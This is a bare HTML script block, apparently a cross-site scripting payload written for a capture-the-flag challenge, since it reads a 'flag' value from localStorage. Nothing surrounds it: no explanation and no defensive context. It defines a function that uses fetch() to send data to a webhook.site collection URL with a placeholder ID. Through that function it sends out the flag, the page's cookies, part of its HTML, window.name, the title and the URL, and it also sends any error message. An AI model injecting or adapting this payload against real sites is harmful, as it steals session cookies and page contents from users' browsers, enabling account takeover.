<script>
function send(data) {
  fetch("https://webhook.site/YOUR-ID-HERE/?data=" + encodeURIComponent(data));
}

try {
  send("flag=" + localStorage.getItem("flag"));
  send("cookie=" + document.cookie);
  send("html=" + document.documentElement.innerHTML.slice(0, 500));
  send("window.name=" + window.name);
  send("title=" + document.title);
  send("url=" + window.location.href);
} catch(e) {
  send("error=" + e.message);
}
</script>
